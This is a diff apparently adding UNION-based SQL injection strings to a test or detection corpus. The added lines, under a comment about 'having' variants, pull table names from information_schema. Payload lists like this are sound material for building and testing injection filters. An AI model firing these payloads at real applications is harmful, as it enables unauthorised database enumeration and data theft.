@@ -436,3 +436,15 @@ sin(1)-1 group by 1 union select 1--
 ((1)) group by (1) union select 1--
 (1) group by ((1)) union select 1--
 (1) group by (1) union select 1--
+
+# more with 'having'
+-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update  UNION select table_name from information_schema.tables limit 1
+1 for update UNION select table_name from information_schema.tables limit 1
